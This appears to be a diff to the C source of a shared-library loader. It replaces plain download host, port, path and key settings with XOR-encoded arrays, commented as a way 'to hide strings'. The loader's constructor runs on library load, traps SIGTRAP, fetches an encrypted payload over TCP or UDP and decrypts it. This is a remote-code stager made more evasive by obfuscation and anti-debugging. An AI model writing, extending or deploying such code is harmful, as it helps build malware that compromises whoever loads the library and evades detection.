@@ -19,19 +19,24 @@
 #include <time.h>
 #include <unistd.h>
 
-/* Configurable Options */
-#ifndef DOWNLOAD_HOST
-#define DOWNLOAD_HOST ""
-#endif /* ifndef MACRO */
-#ifndef DOWNLOAD_PORT
-#define DOWNLOAD_PORT ""
-#endif /* ifndef MACRO */
-#ifndef DOWNLOAD_PATH
-#define DOWNLOAD_PATH ""
-#endif /* ifndef MACRO */
-#ifndef DOWNLOAD_KEY
-#define DOWNLOAD_KEY ""
-#endif /* ifndef MACRO */
+/* Configurable Options - XOR-encoded byte arrays to hide strings */
+#ifndef ENCODED_HOST
+#define ENCODED_HOST 0x00
+#endif
+#ifndef ENCODED_PORT
+#define ENCODED_PORT 0x00
+#endif
+#ifndef ENCODED_PATH
+#define ENCODED_PATH 0x00
+#endif
+#ifndef ENCODED_KEY
+#define ENCODED_KEY 0x00
+#endif
+
+// Random XOR key generated per build
+#ifndef CONFIG_XOR_KEY
+#define CONFIG_XOR_KEY 0x5A
+#endif
 
 #define BUFFER_SIZE 1024
 
@@ -40,8 +45,28 @@
 #define DEBUG_PERROR(msg) perror(msg)
 #else
 #define DEBUG_PRINT(fmt, args...) // Do nothing in release builds
-#define DEBUG_PERROR(msg) // Do nothing in release builds
+#define DEBUG_PERROR(msg)         // Do nothing in release builds
 #endif
+
+// XOR-encoded configuration arrays
+static const unsigned char encoded_host[] = {ENCODED_HOST};
+static const unsigned char encoded_port[] = {ENCODED_PORT};
+static const unsigned char encoded_path[] = {ENCODED_PATH};
+static const unsigned char encoded_key[] = {ENCODED_KEY};
+
+// Decode XOR-obfuscated config string at runtime
+static void decode_config_string(char *dest, const unsigned char *encoded,
+                                 size_t max_len) {
+  size_t i = 0;
+  while (i < max_len - 1) {
+    if (encoded[i] == 0x00)
+      break;
+    dest[i] = encoded[i] ^ CONFIG_XOR_KEY;
+    i++;
+  }
+  dest[i] = '\0';
+  DEBUG_PRINT("Decoded string (len=%zu): %s\n", i, dest);
+}
 
 // forward declarations
 size_t decrypt_data(char *data, size_t data_size, const uint8_t *key,
@@ -179,7 +204,7 @@ size_t download_file(const char *host, const char *port, const char *path,
     DEBUG_PERROR("getaddrinfo");
     return 0;
   }
-  
+
   saved_res = res; // Save for UDP sendto
 
   // Create the socket
@@ -253,24 +278,26 @@ size_t download_file(const char *host, const char *port, const char *path,
   // UDP - receive datagrams
   struct sockaddr_storage src_addr;
   socklen_t src_len = sizeof(src_addr);
-  
+
   // Send key hash as authentication request
   uint32_t key_hash = 0;
   for (int i = 0; i < 16; i++) {
     key_hash ^= ((uint32_t)key[i]) << ((i % 4) * 8);
   }
-  
-  if (sendto(sockfd, &key_hash, sizeof(key_hash), 0, saved_res->ai_addr, saved_res->ai_addrlen) == -1) {
+
+  if (sendto(sockfd, &key_hash, sizeof(key_hash), 0, saved_res->ai_addr,
+             saved_res->ai_addrlen) == -1) {
     DEBUG_PERROR("sendto");
     close(sockfd);
     freeaddrinfo(saved_res);
     return 0;
   }
-  
+
   // Receive data in chunks
   while (1) {
-    ssize_t bytes_received = recvfrom(sockfd, temp_buffer, sizeof(temp_buffer), 0,
-                                      (struct sockaddr *)&src_addr, &src_len);
+    ssize_t bytes_received =
+        recvfrom(sockfd, temp_buffer, sizeof(temp_buffer), 0,
+                 (struct sockaddr *)&src_addr, &src_len);
     if (bytes_received <= 0) {
       break;
     }
@@ -282,7 +309,7 @@ size_t download_file(const char *host, const char *port, const char *path,
     memcpy(*buffer + data_size, temp_buffer, bytes_received);
     data_size += bytes_received;
   }
-  
+
   freeaddrinfo(saved_res);
 #endif
 
@@ -383,11 +410,26 @@ void __attribute__((constructor)) initLibrary(void) {
   sigemptyset(&trap_sa.sa_mask);
   sigaction(SIGTRAP, &trap_sa, NULL);
 
-  // update with the correct host, port, path, and key string
-  const char *host = DOWNLOAD_HOST;
-  const char *port = DOWNLOAD_PORT;
-  const char *path = DOWNLOAD_PATH;
-  const char *key_str = DOWNLOAD_KEY;
+  // Decode XOR-obfuscated configuration at runtime
+  DEBUG_PRINT("XOR key: 0x%02x\n", CONFIG_XOR_KEY);
+
+  char host[256] = {0};
+  char port[16] = {0};
+  char path[256] = {0};
+  char key_str[256] = {0};
+
+  DEBUG_PRINT("Decoding host...\n");
+  decode_config_string(host, encoded_host, sizeof(host));
+  DEBUG_PRINT("Decoding port...\n");
+  decode_config_string(port, encoded_port, sizeof(port));
+  DEBUG_PRINT("Decoding path...\n");
+  decode_config_string(path, encoded_path, sizeof(path));
+  DEBUG_PRINT("Decoding key...\n");
+  decode_config_string(key_str, encoded_key, sizeof(key_str));
+
+  DEBUG_PRINT("Config: host=%s, port=%s, path=%s, key=%s\n", host, port, path,
+              key_str);
+
   uint8_t key[16];
   derive_key_from_string(key_str, key);
   char *enc_buf = NULL;
